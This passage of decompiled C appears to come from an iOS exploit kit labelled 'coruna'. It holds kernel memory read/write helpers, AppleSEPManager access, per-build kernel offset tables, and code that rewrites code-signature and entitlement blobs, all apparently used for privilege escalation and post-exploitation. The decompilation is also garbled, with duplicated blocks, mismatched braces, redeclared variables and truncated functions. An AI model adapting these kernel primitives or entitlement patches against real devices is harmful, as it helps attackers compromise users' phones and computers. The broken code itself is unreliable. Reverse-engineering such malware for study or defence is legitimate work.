              _semaphore_signal(*(semaphore_t *)(addr + 0xc));
              return 0;
            }
            handle = coruna_ptr_canonicalize(handle,bootargs);
            if (handle != 0) {
              u = 0;
              *(int *)(addr + 0x10) = err;
              *(long *)(addr + 0x18) = bootargs;
              if (1 < thread_attr + 1) {
                _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
              }
              _semaphore_signal(*(semaphore_t *)(addr + 0xc));
              return 0;
            }
          }
          u = 0x28026;
        }
      }
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  if (1 < thread_attr + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
    thread_attr = 0;
  }
  if (u == 0 || err == -1) {
    *(uint *)(addr + 0x3c) = u;
    if (u == 0) {
      u = 0xad001;
      do {
        err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
        if (err != 0) {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return 0;
      }
          _semaphore_signal(*(semaphore_t *)(addr + 0xc));
          return 0;
        }
        if (*(char *)(addr + 0x38) != ' ') {
          u = 0;
          *(uint *)(addr + 0x3c) = u;
          _semaphore_signal(*(semaphore_t *)(addr + 0xc));
          return 0;
        }
        if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
           (*(long *)(addr + 0x30) != 8)) goto cleanup;
        scratch = *(long *)(addr + 0x20) + -0x30;
        err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
        if (err == 0) break;
        bootargs = **(long **)(addr + 0x28);
        err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
        if (err != 0) {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return 0;
      }
          _semaphore_signal(*(semaphore_t *)(addr + 0xc));
          return 0;
        }
        scratch.sa_len = '\0';
        scratch.sa_family = '\0';
        scratch.sa_data[0] = '\0';
        scratch.sa_data[1] = '\0';
        scratch.sa_data[2] = '\0';
        scratch.sa_data[3] = '\0';
        scratch.sa_data[4] = '\0';
        scratch.sa_data[5] = '\0';
        err = coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return 0;
      }
    }
  }
  else {
    _close(err);
    *(uint *)(addr + 0x3c) = u;
  }
  _semaphore_signal(*(semaphore_t *)(addr + 0xc));
  return 0;
}





uint coruna_open_sepmgr_1b3bc(long handle,uint64_t val,uint64_t id_2)
{
  long handle;
  int err;
  uint u;
  uint size;
  long addr;
  unsigned long version;
  long scratch;
  
  version = (unsigned long)*(uint *)(handle + 0x10);
  if (*(uint *)(handle + 0x10) + 1 < 2) {
    version = coruna_ioservicegetmatchingservice("AppleSEPManager");
    if ((int)version + 1U < 2) {
      return 0xad011;
    }
    *(int *)(handle + 0x10) = (int)version;
  }
  addr = *(long *)(handle + 0x18);
  if (addr == 0) {
    addr = coruna_kernel29bb0_via_return_zero_1f078(handle,version);
    if (addr == 0) {
      return 0x2800e;
    }
    *(long *)(handle + 0x18) = addr;
  }
  handle = *(long *)(handle + 0x20);
  if (*(long *)(handle + 0x20) == 0) {
    err = coruna_kernel29bb0_via_ioconnectcallmethod_2(handle,addr + 0x28,&scratch);
    if (err == 0) {
      return 0x2800f;
    }
    *(long *)(handle + 0x20) = scratch;
    handle = scratch;
  }
  scratch = handle;
  err = coruna_mach_vm_machine_attribute_17a08(handle,addr + 0x28,val,0);
  size = 0x28010;
  if (err != 0) {
    u = __IOServiceSetAuthorizationID(version,id_2);
    size = 0;
    if (u != 0) {
      if (u == 0x35) {
        if (*(char *)(handle + 0xc) == '\0') {
          size = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_8(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
        }
        else {
          *(uint8_t *)(handle + 0xc) = 0;
          size = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_8(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
          *(uint8_t *)(handle + 0xc) = 1;
        }
        if (size == 0) {
          u = __IOServiceSetAuthorizationID(version,id_2);
          size = 0;
          if (u != 0) {
            size = u & 0xfff | 0x70000000;
          }
        }
      }
      else {
        size = u & 0xfff | 0x70000000;
      }
    }
    err = coruna_mach_vm_machine_attribute_17a08(handle,addr + 0x28,scratch,0);
    u = 0x28010;
    if (size != 0) {
      u = size;
    }
    if (err == 0) {
      size = u;
    }
  }
  return size;
}





int coruna_open_dev_null_1b588(char **path)
{
  int err;
  int status;
  int flags;
  pid_t lp4;
  int *err;
  uint scratch;
  pid_t bootargs;
  posix_spawn_file_actions_t thread_attr;
  sigset_t host_info;
  posix_spawnattr_t serial_buf;
  
  flags = 0xad00b;
  serial_buf = (posix_spawnattr_t)0x0;
  thread_attr = (posix_spawn_file_actions_t)0x0;
  scratch = 0xffffffff;
  bootargs = -1;
  status = 0xad001;
  if ((((path != (char **)0x0) && (*path != (char *)0x0)) && (**path != '\0')) &&
     (err = _posix_spawnattr_init(&serial_buf), status = flags, err == 0)) {
    host_info = 0xffffffff;
    status = _posix_spawnattr_setflags(&serial_buf,7);
    if (((status == 0) && (status = _posix_spawnattr_setsigdefault(&serial_buf,&host_info), status == 0))
       && ((status = _posix_spawnattr_setpgroup(&serial_buf,0), status == 0 &&
           (status = _posix_spawn_file_actions_init(&thread_attr), status == 0)))) {
      flags = _posix_spawn_file_actions_addopen(&thread_attr,0,"/dev/null",0x20000,0);
      if (((flags == 0) &&
          (flags = _posix_spawn_file_actions_addopen(&thread_attr,1,"/dev/null",0x20201,0), flags == 0)
          ) && ((flags = _posix_spawn_file_actions_addopen(&thread_attr,2,"/dev/null",0x20201,0),
                flags == 0 &&
                (flags = _posix_spawn(&bootargs,*path,&thread_attr,&serial_buf,path,(char **)0x0),
                flags == 0)))) {
        flags = 0xad00b;
        do {
          lp4 = _waitpid(bootargs,(int *)&scratch,0);
          if (lp4 == bootargs) {
            if (lp4 != -1) goto fail;
            flags = 0;
          }
          else {
            if (lp4 != -1) break;
            ___error();
          }
          err = ___error();
        } while (*err == 4);
        if (flags == 0) {
fail:
          status = 0;
          if ((scratch & 0xff00) != 0) {
            status = 0xad00b;
          }
          flags = 0xad00b;
          if ((scratch & 0x7f) == 0) {
            flags = status;
          }
        }
      }
      else {
        flags = 0xad00b;
      }
      _posix_spawn_file_actions_destroy(&thread_attr);
    }
    _posix_spawnattr_destroy(&serial_buf);
    status = flags;
  }
  return status;
}





void coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_4(uint64_t val,uint64_t id_2,long *handle,byte arg,long *addr_2)
{
  int err;
  long handle;
  long addr;
  uint scratch;
  uint bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t scratch;
  long sa_saved;
  unsigned long sa_new;
  unsigned long path_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t url_buf;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  long frame;
  
  frame = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  handle = coruna_helper_17db8_202d0();
  addr = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == frame) {
  return;
  }
  ___stack_chk_fail(addr);
}





uint64_t coruna_return_zero_24300(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  uint32_t u;
  uint32_t size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      size = 0x240;
      u = 0x238;
    }
    else if (err == 0x1c1b) {
      size = 0x228;
      u = 0x220;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      u = 0x358;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2a8;
      }
      size = 0x360;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x2b0;
      }
    }
  }
  else if (err < 0x225c) {
    if (err != 0x1f54 && err != 0x2258) {
      return 0;
    }
    size = 0x358;
    u = 0x350;
  }
  else {
    if (err != 0x225c && err != 0x2712) {
      return 0;
    }
    size = 0x550;
    u = 0x548;
  }
  *size = u;
  *flags_2 = size;
  return 1;
}





uint64_t coruna_iosurface_wire_meta_offsets(long handle,uint32_t *size,uint32_t *flags_2)
{
  int err;
  bool err;
  uint64_t u;
  int status;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (size != (uint32_t *)0x0) {
      *size = 0x78;
    }
    if (flags_2 != (uint32_t *)0x0) {
      *flags_2 = 0x50;
    }
    u = 1;
  }
  return u;
}





void coruna_sha1_sha256(int flags,void *ctx,CC_LONG arg,void *scratch,uint *size)
{
  uint u;
  uint64_t size;
  CC_SHA512_CTX CStack_148;
  uchar scratch [48];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  if (flags - 1U < 4) {
    u = *(uint *)(&k_kernel_rodata_word_2af20 + (long)(int)(flags - 1U) * 4);
    if (u <= *size) {
      if (flags - 2U < 2) {
        _CC_SHA256_Init((CC_SHA256_CTX *)&CStack_148);
        _CC_SHA256_Update((CC_SHA256_CTX *)&CStack_148,ctx,arg);
        _CC_SHA256_Final(scratch,(CC_SHA256_CTX *)&CStack_148);
      }
      else if (flags == 4) {
        _CC_SHA384_Init(&CStack_148);
        _CC_SHA384_Update(&CStack_148,ctx,arg);
        _CC_SHA384_Final(scratch,&CStack_148);
      }
      else {
        size = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
        return;
        }
        ___stack_chk_fail(size);
      }
      _memcpy(scratch,scratch,(unsigned long)u);
      *size = u;
      size = 1;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
fail:
  size = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}





uint64_t
void coruna_cfrelease(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            long *handle,uint64_t *off_5,uint8_t *buf)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t scratch;
  
  handle = coruna_plist_from_bytes();
  if (handle == 0) {
    return 0;
  }
  addr = coruna_plist_from_bytes(size_3,off_4);
  if (addr == 0) {
    u = 0;
    _CFRelease(handle);
    return u;
  }
  if (buf == (uint8_t *)0x0) {
done:
    err = coruna_cfdictionaryapplyfunction(handle,addr);
    if (err == 0) goto cleanup;
check_ok:
    u = 0;
  }
  else {
    err = coruna_cfdictionaryapplyfunction_7ba4(handle,addr);
    if (err != 0) {
      *buf = 0;
      goto done;
    }
    *buf = 1;
cleanup:
    off = coruna_cfpropertylistcreatedata(handle,&scratch);
    if (off == 0) goto check_ok;
    *off_5 = scratch;
    *handle = off;
    u = 1;
  }
  _CFRelease(handle);
  handle = addr;
fail:
  _CFRelease(handle);
  return u;
}





long coruna_plist_from_bytes(uint64_t val,uint64_t id_2)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFReadStreamCreateWithBytesNoCopy
                    (u,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
  if (handle == 0) {
    return 0;
  }
  err = _CFReadStreamOpen();
  if (err == 0) {
    addr = 0;
    _CFRelease(handle);
    return addr;
  }
  addr = _CFPropertyListCreateWithStream(u,handle,0,2,0,&scratch);
  if (addr == 0) {
    addr = scratch;
    if (scratch != 0) goto done;
    addr = 0;
  }
  else {
    off = _CFGetTypeID();
    base = _CFDictionaryGetTypeID();
    if (off != base) {
done:
      _CFRelease(addr);
      addr = 0;
    }
  }
  _CFReadStreamClose(handle);
fail:
  _CFRelease(handle);
  return addr;
}





void * coruna_cfpropertylistcreatedata(uint64_t val,size_t *len)
{
  long handle;
  size_t ls2;
  void *ptr;
  void *buf;
  long scratch;
  
  scratch = 0;
  handle = _CFPropertyListCreateData
                    (*(uint64_t *)k_kernel_kcfallocatordefault_slot,val,100,0,&scratch);
  if (handle == 0) {
    handle = scratch;
    if (scratch == 0) {
      return (void *)0x0;
    }
  }
  else {
    ls2 = _CFDataGetLength();
    if (ls2 != 0) {
      ptr = _malloc(ls2);
      if (ptr != (void *)0x0) {
        buf = (void *)_CFDataGetBytePtr(handle);
        _memcpy(ptr,buf,ls2);
        *len = ls2;
      }
      _CFRelease(handle);
      return ptr;
    }
  }
  ptr = (void *)0x0;
fail:
  _CFRelease(handle);
  return ptr;
}





bool coruna_strlcpy(uint64_t val,uint64_t id_2,char *path)
{
  char *ptr;
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  bool err;
  int err;
  void *ptr;
  size_t ls11;
  void *buf;
  uint8_t scratch[104];
  uint kind;
  
  err = coruna_return_zero_1bfe0(val,id_2,scratch);
  if (err == 0) {
    return false;
  }
  ptr = (void *)coruna_wire_map_lookup(scratch,0,0xfade0c02);
  if (ptr == (void *)0x0) {
fail:
    err = false;
    coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
    return err;
  }
  size = *(uint *)((long)ptr + 0x14);
  port = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
  port = port >> 0x10 | port << 0x10;
  if (path == (char *)0x0) {
    err = true;
    coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
    return err;
  }
  else {
    version = *(uint *)((long)ptr + 4);
    if ((size != 0) &&
       (err = _strcmp((char *)((long)ptr + (unsigned long)port),path), err == 0)) {
cleanup:
      err = true;
      coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
      return err;
    }
    tag = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
    kind = tag >> 0x10 | tag << 0x10;
    ls11 = _strlen(path);
    tag = (int)ls11 + 1;
    u = tag + kind;
    buf = _calloc((unsigned long)u,1);
    err = false;
    coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
    return err;
    }
    else {
    version = *(uint *)((long)ptr + 4);
    if ((size != 0) &&
    (err = _strcmp((char *)((long)ptr + (unsigned long)port),path), err == 0)) {
    cleanup:
    err = true;
    coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
    return err;
    }
    tag = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
    kind = tag >> 0x10 | tag << 0x10;
    ls11 = _strlen(path);
    tag = (int)ls11 + 1;
    u = tag + kind;
    buf = _calloc((unsigned long)u,1);
    err = false;
    coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
    return err;
  }
  err = coruna_kernel29bb0_via_memcpy_24a7c(scratch,0,ptr);
  if (err == 0) {
    err = false;
  }
  else {
    err = coruna_open_dev_null_1c258(val,scratch);
    err = err != 0;
  }
  if (buf != (void *)0x0) {
    _free(buf);
  }
done:
  coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
  return err;
}





uint64_t coruna_return_zero_1bfe0(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  uint64_t u;
  long handle;
  unsigned long scratch;
  uint bootargs;
  uint8_t thread_attr[4];
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  unsigned long host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t block_ctx;
  
  err = coruna_return_zero_1df50(val,id_2,0,1,&host_info);
  if ((err == 0) && (u = coruna_return_zero_1df50(val,id_2,0,0,&host_info), (int)u == 0)) {
    return u;
  }
  if (host_info >> 0x1d == 0) {
    handle = coruna_wire_map_lookup(&host_info,action & 0xffffffff,0xfade0c02);
    if ((handle != 0) && (*(int *)(handle + 0x28) == 0)) {
      *(uint32_t *)(handle + 0x28) = 0x80;
      err = coruna_open_dev_null_1c258(val,&host_info);
      coruna_kernel29bb0_via_kernel09_via_bzero_2(&host_info);
      block_ctx = 0;
      block_ctx = 0;
      action = 0;
      sa_saved = 0;
      stack_guard = 0;
      host_info = 0;
      serial_buf = 0;
      action = 0;
      serial_buf = 0;
      scratch = 0;
      host_info = 0;
      thread_attr = 0;
      bootargs = 0;
      if (err == 0) {
        return 0;
      }
      u = coruna_return_zero_1df50(val,id_2,0,1,&host_info);
      if ((int)u == 0) {
        return u;
      }
      size_3[9] = block_ctx;
      size_3[8] = action;
      size_3[0xb] = sa_saved;
      size_3[10] = stack_guard;
      size_3[0xc] = block_ctx;
      size_3[1] = scratch;
      *size_3 = host_info;
      size_3[3] = thread_attr;
      size_3[2] = bootargs;
      size_3[5] = host_info;
      size_3[4] = serial_buf;
      size_3[7] = action;
      size_3[6] = serial_buf;
      return 1;
    }
  }
  else {
    handle = coruna_helper_17db8_202d0(val,action);
    if ((handle != 0) && (err = coruna_return_zero_24300(val,thread_attr,&bootargs), err != 0)) {
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(val,handle + (unsigned long)bootargs,8,&scratch);
      if (err != 0) {
        if (host_info == scratch) {
fail:
          size_3[9] = block_ctx;
          size_3[8] = action;
          size_3[0xb] = sa_saved;
          size_3[10] = stack_guard;
          size_3[0xc] = block_ctx;
          size_3[1] = scratch;
          *size_3 = host_info;
          size_3[3] = thread_attr;
          size_3[2] = bootargs;
          size_3[5] = host_info;
          size_3[4] = serial_buf;
          size_3[7] = action;
          size_3[6] = serial_buf;
          return 1;
        }
        err = coruna_kernel29bb0_via_return_zero_2b0c0_2(val,action);
        if (err != 0) {
          scratch = host_info;
          err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(val,handle + (unsigned long)bootargs,&scratch,8);
          size_3[9] = block_ctx;
          size_3[8] = action;
          size_3[0xb] = sa_saved;
          size_3[10] = stack_guard;
          size_3[0xc] = block_ctx;
          size_3[1] = scratch;
          *size_3 = host_info;
          size_3[3] = thread_attr;
          size_3[2] = bootargs;
          size_3[5] = host_info;
          size_3[4] = serial_buf;
          size_3[7] = action;
          size_3[6] = serial_buf;
          return 1;
        }
      }
    }
  }
  coruna_kernel29bb0_via_kernel09_via_bzero_2(&host_info);
  return 0;
}





uint * coruna_wire_map_lookup(long handle,int flags,uint size)
{
  uint u;
  unsigned long size;
  uint64_t *ptr;
  
  if (handle != 0) {
    if (*(int *)(handle + 0x30) == 0) {
      if ((flags == 0) && (**(uint **)(handle + 0x38) == 0x20cdefa)) {
        return *(uint **)(handle + 0x38);
      }
    }
    else if (*(int *)(handle + 0x30) == 1) {
      u = **(uint **)(handle + 0x38);
      size = (unsigned long)u;
      if (u != 0) {
        ptr = (uint64_t *)(*(long *)(*(uint **)(handle + 0x38) + 2) + 8);
        do {
          if ((*(int *)(ptr + -1) == flags) &&
             (u = *(uint *)*ptr, u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8,
             (u >> 0x10 | u << 0x10) == size)) {
            return (uint *)*ptr;
          }
          ptr = ptr + 2;
          size = size - 1;
        } while (size != 0);
      }
    }
  }
  return (uint *)0x0;
}





uint64_t coruna_kernel29bb0_via_memcpy_24a7c(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  long addr;
  uint64_t u;
  
  handle = coruna_wire_map_slot_lookup(val,id_2,0xfade0c02);
  u = 0;
  if ((handle != 0) && (addr = coruna_memcpy_24a7c(size_3), u = 0, addr != 0)) {
    u = *(uint64_t *)(handle + 8);
    *(long *)(handle + 8) = addr;
    coruna_bzero(u);
    u = 1;
  }
  return u;
}





void coruna_open_dev_null_1c258(long handle,uint8_t *buf)
{
  long handle;
  uint u;
  uint size;
  uint version;
  bool err;
  int err;
  int status;
  int flags;
  int count;
  uint32_t *ptr;
  long addr;
  long off;
  int *err;
  void *ptr;
  uint port;
  unsigned long tag;
  long base;
  long ctx_val;
  long *buf;
  uint *buf;
  uint kind;
  uint *str;
  int idx;
  uint8_t *copy;
  unsigned long type_id;
  unsigned long type_id_8;
  uint type_id_9;
  unsigned long type_id_10;
  uint *data;
  unsigned long scratch;
  uint bootargs;
  long thread_attr;
  uint host_info;
  uint serial_buf;
  uint64_t action;
  uint8_t block_ctx[8];
  long stack_guard;
  int sa_saved;
  uint64_t sa_new;
  unsigned long path_buf;
  uint tmp_buf;
  uint64_t region;
  long plist;
  long url_buf;
  unsigned long json_buf;
  long frame [6];
  uint64_t work;
  unsigned long cache;
  uint32_t *cache_20;
  unsigned long cache_21;
  uint64_t scratch;
  uint64_t cache_22;
  unsigned long bootargs;
  uint64_t thread_attr;
  long cache_23;
  uint64_t cache_24;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t cache_25;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t cache_26;
  uint64_t sa_new;
  long cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t cache_30;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t cache_31;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  long cache_32;
  
  cache_32 = *(long *)k_kernel_stack_chk_guard_slot;
  sa_new = 0x20000000;
  action = 0;
  bootargs = 0;
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (*(int *)(buf + 0x30) == 0) {
    port = 0;
    u = (*(uint *)(*(long *)(buf + 0x38) + 4) & 0xff00ff00) >> 8 |
            (*(uint *)(*(long *)(buf + 0x38) + 4) & 0xff00ff) << 8;
    u = u >> 0x10 | u << 0x10;
    status = 0xc;
  }
  else {
    err = false;
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_32) {
    return;
    }
    ___stack_chk_fail(err);
  }
  tag = (unsigned long)u;
  ptr = _malloc(tag);
  err = false;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_32) {
  return;
  }
  ___stack_chk_fail(err);
}





void coruna_kernel29bb0_via_kernel09_via_bzero_2(long handle)
{
  if (*(int *)(handle + 0x30) == 0) {
    coruna_bzero(*(uint64_t *)(handle + 0x38));
  }
  else if (*(int *)(handle + 0x30) == 1) {
    coruna_kernel09_via_bzero_2(*(uint64_t *)(handle + 0x38));
  }
  *(uint64_t *)(handle + 0x38) = 0;
  *(uint32_t *)(handle + 0x30) = 0xffffffff;
  return;
}





uint64_t coruna_bzero_2(uint64_t val,uint64_t id_2,char *path,unsigned long arg)
{
  uint u;
  uint size;
  uint version;
  uint port;
  bool err;
  int err;
  uint64_t tag;
  long handle;
  size_t ls9;
  size_t ls10;
  void *ptr;
  void *buf;
  uint32_t *ptr;
  uint kind;
  unsigned long type_id;
  char scratch;
  uint bootargs [2];
  void *thread_attr;
  byte host_info [48];
  int serial_buf;
  uint64_t action;
  uint32_t block_ctx;
  int stack_guard;
  
  thread_attr = (void *)0x0;
  scratch = '\0';
  tag = coruna_return_zero_1bfe0(val,id_2,host_info);
  if ((int)tag == 0) {
    return tag;
  }
  handle = coruna_wire_map_lookup(host_info,5,0xfade7171);
  if (handle == 0) {
    err = true;
    ptr = thread_attr;
    if (ptr != (void *)0x0) {
    _free(ptr);
    }
    coruna_kernel29bb0_via_kernel09_via_bzero_2(host_info);
    if (err) {
    tag = 0;
    }
    else if ((arg & 1) == 0) {
    tag = 1;
    }
    else {
    tag = coruna_cfpropertylistcreatewithdata(val,id_2,path,0);
    }
    return tag;
  }
  else {
    kind = (*(uint *)(handle + 4) & 0xff00ff00) >> 8 | (*(uint *)(handle + 4) & 0xff00ff) << 8;
    ls9 = _strlen(path);
    err = coruna_cfrelease(handle + 8,(unsigned long)(kind >> 0x10 | kind << 0x10) - 8,path,ls9,
                         &thread_attr,bootargs,&scratch);
    ptr = thread_attr;
    if (err != 0) {
      if (scratch != '\0') {
        err = false;
        if (ptr != (void *)0x0) {
        _free(ptr);
        }
        coruna_kernel29bb0_via_kernel09_via_bzero_2(host_info);
        if (err) {
        tag = 0;
        }
        else if ((arg & 1) == 0) {
        tag = 1;
        }
        else {
        tag = coruna_cfpropertylistcreatewithdata(val,id_2,path,0);
        }
        return tag;
      }
      handle = coruna_wire_map_slot_lookup(host_info,5,0xfade7171);
      if (handle == 0) {
        err = true;
        if (ptr != (void *)0x0) {
        _free(ptr);
        }
        coruna_kernel29bb0_via_kernel09_via_bzero_2(host_info);
        if (err) {
        tag = 0;
        }
        else if ((arg & 1) == 0) {
        tag = 1;
        }
        else {
        tag = coruna_cfpropertylistcreatewithdata(val,id_2,path,0);
        }
        return tag;
      }
      ls9 = (unsigned long)bootargs[0] + 8;
      ptr = _malloc(ls9);
      if (ptr != (uint32_t *)0x0) {
        kind = (uint)ls9;
        kind = (kind & 0xff00ff00) >> 8 | (kind & 0xff00ff) << 8;
        *ptr = 0x7171defa;
        ptr[1] = kind >> 0x10 | kind << 0x10;
        _memcpy(ptr + 2,ptr,(unsigned long)bootargs[0]);
        tag = *(uint64_t *)(handle + 8);
        *(uint32_t **)(handle + 8) = ptr;
        coruna_bzero(tag);
        goto done;
      }
    }
  }
  err = true;
  ptr = thread_attr;
fail:
  if (ptr != (void *)0x0) {
    _free(ptr);
  }
  coruna_kernel29bb0_via_kernel09_via_bzero_2(host_info);
  if (err) {
    tag = 0;
  }
  else if ((arg & 1) == 0) {
    tag = 1;
  }
  else {
    tag = coruna_cfpropertylistcreatewithdata(val,id_2,path,0);
  }
  return tag;
}





void coruna_kernel29bb0_via_wire_map_lookup(long handle)
{
  uint u;
  long handle;
  long addr;
  uint64_t size;
  void *ptr;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_wire_map_lookup(handle,5,0xfade7171);
  addr = coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
  return;
  }
  ___stack_chk_fail(size);
}





uint64_t coruna_return_zero_26090(long handle,uint64_t val)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  long base;
  long ctx_val;
  char scratch;
  
  scratch = '\0';
  u = 1;
  err = coruna_ctx_test_flag(handle,0x5184201);
  if (err != 0) {
    do {
    handle = coruna_kernel29bb0_via_return_zero_2019c(handle,val);
    if (handle == 0) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5184001);
      if (err == 0) {
        u = coruna_ctx_test_flag(handle,0x200);
        if ((int)u == 0) {
          return u;
        }
        err = *(int *)(handle + 0x140);
        if (err < 0x1809) break;
        if (err < 0x2258) {
          if (err < 0x1f53) {
            if (err < 0x1c1b) {
              off = 0xe7;
              if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
                off = 0xef;
              }
            }
            else {
              off = 0xdf;
            }
          }
          else {
            off = 0x97;
          }
        }
        else {
          off = 0x8f;
        }
        off = handle + 0x92;
        u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
        if ((int)u == 0) {
          return u;
        }
        if (scratch != '\0') {
          break;
        }
        u = 0;
        break;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2712) {
        if (0x2257 < err) {
          err = coruna_ctx_test_flag(handle,0x1180000);
          err = err == 0;
          ctx_val = 0xb9;
          if (!err) {
            ctx_val = 0xc1;
          }
          base = 0xba;
          if (!err) {
            base = 0xc2;
          }
          addr = 0xbf;
          off = 0xb7;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        if (0x1f52 < err) {
          u = 0x180000;
          err = coruna_ctx_test_flag(handle,u);
          err = err == 0;
          ctx_val = 0xc1;
          if (!err) {
          ctx_val = 0xc9;
          }
          base = 0xc2;
          if (!err) {
          base = 0xca;
          }
          addr = 199;
          off = 0xbf;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        size = *(unsigned long *)(handle + 0x158);
        if (0x1c1b0a800fffff < size) {
          err = coruna_ctx_test_flag(handle,0x80000);
          err = err == 0;
          ctx_val = 0x101;
          if (!err) {
            ctx_val = 0x109;
          }
